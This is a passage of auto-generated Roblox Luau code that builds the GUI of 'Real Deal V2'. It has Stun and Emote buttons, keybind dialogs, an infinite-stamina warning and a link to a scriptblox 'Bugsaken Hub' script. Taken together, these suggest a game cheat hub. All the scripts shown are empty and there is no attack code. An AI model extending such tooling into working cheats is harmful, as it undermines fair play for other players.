-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.STOPSKIDDIN.TextLabel.TextButton
G2L["139"] = Instance.new("TextButton", G2L["138"]);
G2L["139"]["TextWrapped"] = true;
G2L["139"]["BorderSizePixel"] = 0;
G2L["139"]["TextSize"] = 14;
G2L["139"]["TextScaled"] = true;
G2L["139"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["139"]["BackgroundColor3"] = Color3.fromRGB(255, 249, 147);
G2L["139"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["139"]["Size"] = UDim2.new(0.61576, 0, 0.39601, 0);
G2L["139"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["139"]["Text"] = [[CLICK TO COPY]];
G2L["139"]["Position"] = UDim2.new(0.19, 0, 0.97624, 0);
-- Attributes
G2L["139"]:SetAttribute([[DONTCHANGE]], [[https://scriptblox.com/script/Forsaken-Bugsaken-Hub-65398]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.STOPSKIDDIN.TextLabel.TextButton.LocalScript
G2L["13a"] = Instance.new("LocalScript", G2L["139"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.STOPSKIDDIN.TextLabel.TextButton.UICorner
G2L["13b"] = Instance.new("UICorner", G2L["139"]);
G2L["13b"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.STOPSKIDDIN.TextLabel.TextButton.UIStroke
G2L["13c"] = Instance.new("UIStroke", G2L["139"]);
G2L["13c"]["Thickness"] = 2;
G2L["13c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Admin
G2L["13d"] = Instance.new("Frame", G2L["6b"]);
G2L["13d"]["BorderSizePixel"] = 0;
G2L["13d"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
G2L["13d"]["Size"] = UDim2.new(0.99982, 0, 0.85028, 0);
G2L["13d"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["13d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13d"]["Name"] = [[Admin]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Admin.TextLabel
G2L["13e"] = Instance.new("TextLabel", G2L["13d"]);
G2L["13e"]["BorderSizePixel"] = 0;
G2L["13e"]["TextSize"] = 14;
G2L["13e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13e"]["Size"] = UDim2.new(0.61471, 0, 0.15289, 0);
G2L["13e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13e"]["Text"] = [[IDK WHAT TO ADD DUDE]];
G2L["13e"]["Position"] = UDim2.new(0, 0, -0.00306, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.UIAspectRatioConstraint
G2L["13f"] = Instance.new("UIAspectRatioConstraint", G2L["43"]);
G2L["13f"]["AspectRatio"] = 0.84608;


-- StarterGui.Real Deal V2.Main.StunBtn
G2L["140"] = Instance.new("TextButton", G2L["a"]);
G2L["140"]["TextWrapped"] = true;
G2L["140"]["BorderSizePixel"] = 0;
G2L["140"]["TextSize"] = 26;
G2L["140"]["AutoButtonColor"] = false;
G2L["140"]["TextScaled"] = true;
G2L["140"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["140"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["140"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["140"]["ZIndex"] = 123;
G2L["140"]["Size"] = UDim2.new(0.05388, 0, 0.07911, 0);
G2L["140"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["140"]["Text"] = [[Stun ]];
G2L["140"]["Name"] = [[StunBtn]];
G2L["140"]["Position"] = UDim2.new(0.91838, 0, 0.20253, 0);


-- StarterGui.Real Deal V2.Main.StunBtn.LocalScript
G2L["141"] = Instance.new("LocalScript", G2L["140"]);



-- StarterGui.Real Deal V2.Main.StunBtn.UICorner
G2L["142"] = Instance.new("UICorner", G2L["140"]);
G2L["142"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.StunBtn.UIStroke
G2L["143"] = Instance.new("UIStroke", G2L["140"]);
G2L["143"]["Thickness"] = 2.1;
G2L["143"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["143"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;


-- StarterGui.Real Deal V2.Main.StunBtn.UIAspectRatioConstraint
G2L["144"] = Instance.new("UIAspectRatioConstraint", G2L["140"]);
G2L["144"]["AspectRatio"] = 1.50764;


-- StarterGui.Real Deal V2.Main.Open
G2L["145"] = Instance.new("ImageButton", G2L["a"]);
G2L["145"]["BorderSizePixel"] = 0;
G2L["145"]["BackgroundColor3"] = Color3.fromRGB(255, 240, 12);
G2L["145"]["Image"] = [[rbxassetid://5205790785]];
G2L["145"]["Size"] = UDim2.new(0.01574, 0, 0.04154, 0);
G2L["145"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["145"]["Name"] = [[Open]];
G2L["145"]["Position"] = UDim2.new(0.22231, 0, 0.17638, 0);


-- StarterGui.Real Deal V2.Main.Open.LocalScript
G2L["146"] = Instance.new("LocalScript", G2L["145"]);



-- StarterGui.Real Deal V2.Main.Open.UIAspectRatioConstraint
G2L["147"] = Instance.new("UIAspectRatioConstraint", G2L["145"]);
G2L["147"]["AspectRatio"] = 1;


-- StarterGui.Real Deal V2.Main.Open.UICorner
G2L["148"] = Instance.new("UICorner", G2L["145"]);
G2L["148"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.Main.Open.UIStroke
G2L["149"] = Instance.new("UIStroke", G2L["145"]);
G2L["149"]["Thickness"] = 2.2;


-- StarterGui.Real Deal V2.Main.HAKARIBUTTON
G2L["14a"] = Instance.new("TextButton", G2L["a"]);
G2L["14a"]["TextWrapped"] = true;
G2L["14a"]["BorderSizePixel"] = 0;
G2L["14a"]["TextSize"] = 21;
G2L["14a"]["AutoButtonColor"] = false;
G2L["14a"]["TextScaled"] = true;
G2L["14a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["14a"]["ZIndex"] = 123;
G2L["14a"]["Size"] = UDim2.new(0.05388, 0, 0.07911, 0);
G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["Text"] = [[Emote  ]];
G2L["14a"]["Name"] = [[HAKARIBUTTON]];
G2L["14a"]["Position"] = UDim2.new(0.91838, 0, 0.28165, 0);


-- StarterGui.Real Deal V2.Main.HAKARIBUTTON.LocalScript
G2L["14b"] = Instance.new("LocalScript", G2L["14a"]);



-- StarterGui.Real Deal V2.Main.HAKARIBUTTON.UICorner
G2L["14c"] = Instance.new("UICorner", G2L["14a"]);
G2L["14c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.HAKARIBUTTON.UIStroke
G2L["14d"] = Instance.new("UIStroke", G2L["14a"]);
G2L["14d"]["Thickness"] = 2.1;
G2L["14d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["14d"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;


-- StarterGui.Real Deal V2.Main.HAKARIBUTTON.UIAspectRatioConstraint
G2L["14e"] = Instance.new("UIAspectRatioConstraint", G2L["14a"]);
G2L["14e"]["AspectRatio"] = 1.50764;


-- StarterGui.Real Deal V2.Main.Warning
G2L["14f"] = Instance.new("Frame", G2L["a"]);
G2L["14f"]["Visible"] = false;
G2L["14f"]["BorderSizePixel"] = 0;
G2L["14f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14f"]["Size"] = UDim2.new(0.30918, 0, 0.58228, 0);
G2L["14f"]["Position"] = UDim2.new(0.59676, 0, 0.22152, 0);
G2L["14f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14f"]["Name"] = [[Warning]];


-- StarterGui.Real Deal V2.Main.Warning.LocalScript
G2L["150"] = Instance.new("LocalScript", G2L["14f"]);



-- StarterGui.Real Deal V2.Main.Warning.TextLabel
G2L["151"] = Instance.new("TextLabel", G2L["14f"]);
G2L["151"]["TextWrapped"] = true;
G2L["151"]["BorderSizePixel"] = 0;
G2L["151"]["TextSize"] = 14;
G2L["151"]["TextScaled"] = true;
G2L["151"]["BackgroundColor3"] = Color3.fromRGB(244, 255, 17);
G2L["151"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["151"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
G2L["151"]["Size"] = UDim2.new(1, 0, 0.85598, 0);
G2L["151"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["151"]["Text"] = [[If You Use Infinte Stamina With Any Of The Set Stamina Modules The Script MAY/MAY NOT break but it is still advised to not use them together]];


-- StarterGui.Real Deal V2.Main.Warning.TextLabel.TextButton
G2L["152"] = Instance.new("TextButton", G2L["151"]);
G2L["152"]["TextWrapped"] = true;
G2L["152"]["BorderSizePixel"] = 0;
G2L["152"]["TextSize"] = 14;
G2L["152"]["TextScaled"] = true;
G2L["152"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["152"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["152"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["152"]["Size"] = UDim2.new(1, 0, 0.16825, 0);
G2L["152"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["152"]["Text"] = [[OKAY I UNDERSTAND]];
G2L["152"]["Position"] = UDim2.new(0, 0, 0.99683, 0);


-- StarterGui.Real Deal V2.Main.Warning.UIAspectRatioConstraint
G2L["153"] = Instance.new("UIAspectRatioConstraint", G2L["14f"]);
G2L["153"]["AspectRatio"] = 1.08967;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI
G2L["154"] = Instance.new("Frame", G2L["a"]);
G2L["154"]["Visible"] = false;
G2L["154"]["ZIndex"] = 10;
G2L["154"]["BorderSizePixel"] = 0;
G2L["154"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
G2L["154"]["Size"] = UDim2.new(0.67744, 0, 0.61102, 0);
G2L["154"]["Position"] = UDim2.new(0.17694, 0, 0.24842, 0);
G2L["154"]["BorderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["154"]["Name"] = [[KeybindThingyForHAKARI]];


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Dragg
G2L["155"] = Instance.new("LocalScript", G2L["154"]);
G2L["155"]["Enabled"] = false;
G2L["155"]["Name"] = [[Dragg]];
G2L["155"]["Disabled"] = true;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.UICorner
G2L["156"] = Instance.new("UICorner", G2L["154"]);
G2L["156"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.UIStroke
G2L["157"] = Instance.new("UIStroke", G2L["154"]);
G2L["157"]["Thickness"] = 3.4;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.TextLabel
G2L["158"] = Instance.new("TextLabel", G2L["154"]);
G2L["158"]["TextWrapped"] = true;
G2L["158"]["ZIndex"] = 10;
G2L["158"]["BorderSizePixel"] = 0;
G2L["158"]["TextSize"] = 48;
G2L["158"]["TextScaled"] = true;
G2L["158"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["158"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["158"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["158"]["BackgroundTransparency"] = 1;
G2L["158"]["Size"] = UDim2.new(0.75135, 0, 0.41446, 0);
G2L["158"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["158"]["Text"] = [[You Are On PC Your Emote Keybind Is : (Enter The Keybind)(default is z)]];
G2L["158"]["Position"] = UDim2.new(0.15367, 0, 0.15317, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.TextBox
G2L["159"] = Instance.new("TextBox", G2L["154"]);
G2L["159"]["ZIndex"] = 10;
G2L["159"]["BorderSizePixel"] = 0;
G2L["159"]["TextWrapped"] = true;
G2L["159"]["TextSize"] = 47;
G2L["159"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["159"]["TextScaled"] = true;
G2L["159"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["159"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["159"]["Size"] = UDim2.new(0.76368, 0, 0.12887, 0);
G2L["159"]["Position"] = UDim2.new(0.11758, 0, 0.64691, 0);
G2L["159"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["159"]["Text"] = [[ENTER THE KEYBIND DEFAULT IS "Z"]];
G2L["159"]["BackgroundTransparency"] = 0.5;
-- Attributes
G2L["159"]:SetAttribute([[value]], [[]]);
G2L["159"]:SetAttribute([[canchange]], false);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.TextBox.UICorner
G2L["15a"] = Instance.new("UICorner", G2L["159"]);
G2L["15a"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.TextBox.TextButton
G2L["15b"] = Instance.new("TextButton", G2L["159"]);
G2L["15b"]["TextWrapped"] = true;
G2L["15b"]["BorderSizePixel"] = 0;
G2L["15b"]["TextSize"] = 14;
G2L["15b"]["TextScaled"] = true;
G2L["15b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(113, 113, 113);
G2L["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15b"]["ZIndex"] = 10;
G2L["15b"]["Size"] = UDim2.new(0.30488, 0, 1, 0);
G2L["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["Text"] = [[PRESS AFTER SETTING]];
G2L["15b"]["Position"] = UDim2.new(0.34756, 0, 1, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.TextBox.TextButton.LocalScript
G2L["15c"] = Instance.new("LocalScript", G2L["15b"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.TextBox.TextButton.UICorner
G2L["15d"] = Instance.new("UICorner", G2L["15b"]);
G2L["15d"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.UIAspectRatioConstraint
G2L["15e"] = Instance.new("UIAspectRatioConstraint", G2L["154"]);
G2L["15e"]["AspectRatio"] = 2.21392;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.UIDragDetector
G2L["15f"] = Instance.new("UIDragDetector", G2L["154"]);
G2L["15f"]["DragUDim2"] = UDim2.new(0, -7, 0, -8);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm
G2L["160"] = Instance.new("Frame", G2L["154"]);
G2L["160"]["ZIndex"] = 10;
G2L["160"]["BorderSizePixel"] = 0;
G2L["160"]["BackgroundColor3"] = Color3.fromRGB(196, 255, 107);
G2L["160"]["Size"] = UDim2.new(0.19941, 0, 0.42563, 0);
G2L["160"]["Position"] = UDim2.new(0.44071, -39, 0.5807, -143);
G2L["160"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["160"]["Name"] = [[Confirm]];


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.Dragg
G2L["161"] = Instance.new("LocalScript", G2L["160"]);
G2L["161"]["Enabled"] = false;
G2L["161"]["Name"] = [[Dragg]];
G2L["161"]["Disabled"] = true;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.LocalScript
G2L["162"] = Instance.new("LocalScript", G2L["160"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.UICorner
G2L["163"] = Instance.new("UICorner", G2L["160"]);
G2L["163"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.Yes
G2L["164"] = Instance.new("TextButton", G2L["160"]);
G2L["164"]["TextWrapped"] = true;
G2L["164"]["BorderSizePixel"] = 0;
G2L["164"]["TextSize"] = 37;
G2L["164"]["TextScaled"] = true;
G2L["164"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["BackgroundColor3"] = Color3.fromRGB(81, 186, 0);
G2L["164"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["164"]["ZIndex"] = 10;
G2L["164"]["Size"] = UDim2.new(0.18987, 0, 0.18587, 0);
G2L["164"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["Text"] = [[Yes]];
G2L["164"]["Name"] = [[Yes]];
G2L["164"]["Position"] = UDim2.new(0.10037, 0, 0.6803, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.Yes.LocalScript
G2L["165"] = Instance.new("LocalScript", G2L["164"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.Yes.UICorner
G2L["166"] = Instance.new("UICorner", G2L["164"]);
G2L["166"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.No
G2L["167"] = Instance.new("TextButton", G2L["160"]);
G2L["167"]["TextWrapped"] = true;
G2L["167"]["BorderSizePixel"] = 0;
G2L["167"]["TextSize"] = 43;
G2L["167"]["TextScaled"] = true;
G2L["167"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["167"]["BackgroundColor3"] = Color3.fromRGB(135, 0, 3);
G2L["167"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["167"]["ZIndex"] = 10;
G2L["167"]["Size"] = UDim2.new(0.18987, 0, 0.18587, 0);
G2L["167"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["167"]["Text"] = [[No]];
G2L["167"]["Name"] = [[No]];
G2L["167"]["Position"] = UDim2.new(0.69888, 0, 0.6803, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.No.LocalScript
G2L["168"] = Instance.new("LocalScript", G2L["167"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.No.UICorner
G2L["169"] = Instance.new("UICorner", G2L["167"]);
G2L["169"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.TextLabel
G2L["16a"] = Instance.new("TextLabel", G2L["160"]);
G2L["16a"]["TextWrapped"] = true;
G2L["16a"]["ZIndex"] = 10;
G2L["16a"]["BorderSizePixel"] = 0;
G2L["16a"]["TextSize"] = 62;
G2L["16a"]["TextScaled"] = true;
G2L["16a"]["BackgroundColor3"] = Color3.fromRGB(154, 210, 0);
G2L["16a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16a"]["Size"] = UDim2.new(0.7446, 0, 0.53532, 0);
G2L["16a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16a"]["Text"] = [[Confirm?]];
G2L["16a"]["Position"] = UDim2.new(0.12639, 0, 0.07063, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.TextLabel.UIStroke
G2L["16b"] = Instance.new("UIStroke", G2L["16a"]);
G2L["16b"]["Thickness"] = 3.4;
G2L["16b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.TextLabel.UICorner
G2L["16c"] = Instance.new("UICorner", G2L["16a"]);
G2L["16c"]["CornerRadius"] = UDim.new(0, 14);


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.UIStroke
G2L["16d"] = Instance.new("UIStroke", G2L["160"]);
G2L["16d"]["Thickness"] = 3.4;
G2L["16d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.UIAspectRatioConstraint
G2L["16e"] = Instance.new("UIAspectRatioConstraint", G2L["160"]);
G2L["16e"]["AspectRatio"] = 1.00074;


-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.UIDragDetector
G2L["16f"] = Instance.new("UIDragDetector", G2L["160"]);
G2L["16f"]["DragUDim2"] = UDim2.new(0, -25, 0, -101);


-- StarterGui.Real Deal V2.Main.KeybindThingy
G2L["170"] = Instance.new("Frame", G2L["a"]);
G2L["170"]["Visible"] = false;
G2L["170"]["ZIndex"] = 10;
G2L["170"]["BorderSizePixel"] = 0;
G2L["170"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
G2L["170"]["Size"] = UDim2.new(0.67744, 0, 0.61102, 0);
G2L["170"]["Position"] = UDim2.new(0.17694, 0, 0.24842, 0);
G2L["170"]["BorderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["170"]["Name"] = [[KeybindThingy]];


-- StarterGui.Real Deal V2.Main.KeybindThingy.Dragg
G2L["171"] = Instance.new("LocalScript", G2L["170"]);
G2L["171"]["Enabled"] = false;
G2L["171"]["Name"] = [[Dragg]];
G2L["171"]["Disabled"] = true;


-- StarterGui.Real Deal V2.Main.KeybindThingy.UICorner
G2L["172"] = Instance.new("UICorner", G2L["170"]);
G2L["172"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingy.UIStroke
G2L["173"] = Instance.new("UIStroke", G2L["170"]);
G2L["173"]["Thickness"] = 3.4;


-- StarterGui.Real Deal V2.Main.KeybindThingy.TextLabel
G2L["174"] = Instance.new("TextLabel", G2L["170"]);
G2L["174"]["TextWrapped"] = true;
G2L["174"]["ZIndex"] = 10;
G2L["174"]["BorderSizePixel"] = 0;
G2L["174"]["TextSize"] = 48;
G2L["174"]["TextScaled"] = true;
G2L["174"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["174"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["174"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["174"]["BackgroundTransparency"] = 1;
G2L["174"]["Size"] = UDim2.new(0.75135, 0, 0.41446, 0);
G2L["174"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["174"]["Text"] = [[You Are On PC Your Stun Keybind Is : (Enter The Keybind)(default is z)]];
G2L["174"]["Position"] = UDim2.new(0.15367, 0, 0.15317, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingy.TextBox
G2L["175"] = Instance.new("TextBox", G2L["170"]);
G2L["175"]["ZIndex"] = 10;
G2L["175"]["BorderSizePixel"] = 0;
G2L["175"]["TextWrapped"] = true;
G2L["175"]["TextSize"] = 47;
G2L["175"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["175"]["TextScaled"] = true;
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["175"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["175"]["Size"] = UDim2.new(0.76368, 0, 0.12887, 0);
G2L["175"]["Position"] = UDim2.new(0.11758, 0, 0.64691, 0);
G2L["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["175"]["Text"] = [[ENTER THE KEYBIND DEFAULT IS "Z"]];
G2L["175"]["BackgroundTransparency"] = 0.5;
-- Attributes
G2L["175"]:SetAttribute([[value]], [[]]);
G2L["175"]:SetAttribute([[canchange]], false);


-- StarterGui.Real Deal V2.Main.KeybindThingy.TextBox.UICorner
G2L["176"] = Instance.new("UICorner", G2L["175"]);
G2L["176"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingy.TextBox.TextButton
G2L["177"] = Instance.new("TextButton", G2L["175"]);
G2L["177"]["TextWrapped"] = true;
G2L["177"]["BorderSizePixel"] = 0;
G2L["177"]["TextSize"] = 14;
G2L["177"]["TextScaled"] = true;
G2L["177"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["177"]["BackgroundColor3"] = Color3.fromRGB(113, 113, 113);
G2L["177"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["177"]["ZIndex"] = 10;
G2L["177"]["Size"] = UDim2.new(0.30488, 0, 1, 0);
G2L["177"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["177"]["Text"] = [[PRESS AFTER SETTING]];
G2L["177"]["Position"] = UDim2.new(0.34756, 0, 1, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingy.TextBox.TextButton.LocalScript
G2L["178"] = Instance.new("LocalScript", G2L["177"]);



-- StarterGui.Real Deal V2.Main.KeybindThingy.TextBox.TextButton.UICorner
G2L["179"] = Instance.new("UICorner", G2L["177"]);
G2L["179"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingy.UIAspectRatioConstraint
G2L["17a"] = Instance.new("UIAspectRatioConstraint", G2L["170"]);
G2L["17a"]["AspectRatio"] = 2.21392;


-- StarterGui.Real Deal V2.Main.KeybindThingy.UIDragDetector
G2L["17b"] = Instance.new("UIDragDetector", G2L["170"]);
G2L["17b"]["DragUDim2"] = UDim2.new(0, -7, 0, -8);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm
G2L["17c"] = Instance.new("Frame", G2L["170"]);
G2L["17c"]["ZIndex"] = 10;
G2L["17c"]["BorderSizePixel"] = 0;
G2L["17c"]["BackgroundColor3"] = Color3.fromRGB(196, 255, 107);
G2L["17c"]["Size"] = UDim2.new(0.19941, 0, 0.42563, 0);
G2L["17c"]["Position"] = UDim2.new(0.44071, -39, 0.5807, -143);
G2L["17c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17c"]["Name"] = [[Confirm]];


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.Dragg
G2L["17d"] = Instance.new("LocalScript", G2L["17c"]);
G2L["17d"]["Enabled"] = false;
G2L["17d"]["Name"] = [[Dragg]];
G2L["17d"]["Disabled"] = true;


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.LocalScript
G2L["17e"] = Instance.new("LocalScript", G2L["17c"]);



-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.UICorner
G2L["17f"] = Instance.new("UICorner", G2L["17c"]);
G2L["17f"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.Yes
G2L["180"] = Instance.new("TextButton", G2L["17c"]);
G2L["180"]["TextWrapped"] = true;
G2L["180"]["BorderSizePixel"] = 0;
G2L["180"]["TextSize"] = 37;
G2L["180"]["TextScaled"] = true;
G2L["180"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["180"]["BackgroundColor3"] = Color3.fromRGB(81, 186, 0);
G2L["180"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["180"]["ZIndex"] = 10;
G2L["180"]["Size"] = UDim2.new(0.18987, 0, 0.18587, 0);
G2L["180"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["180"]["Text"] = [[Yes]];
G2L["180"]["Name"] = [[Yes]];
G2L["180"]["Position"] = UDim2.new(0.10037, 0, 0.6803, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.Yes.LocalScript
G2L["181"] = Instance.new("LocalScript", G2L["180"]);



-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.Yes.UICorner
G2L["182"] = Instance.new("UICorner", G2L["180"]);
G2L["182"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.No
G2L["183"] = Instance.new("TextButton", G2L["17c"]);
G2L["183"]["TextWrapped"] = true;
G2L["183"]["BorderSizePixel"] = 0;
G2L["183"]["TextSize"] = 43;
G2L["183"]["TextScaled"] = true;
G2L["183"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["183"]["BackgroundColor3"] = Color3.fromRGB(135, 0, 3);
G2L["183"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["183"]["ZIndex"] = 10;
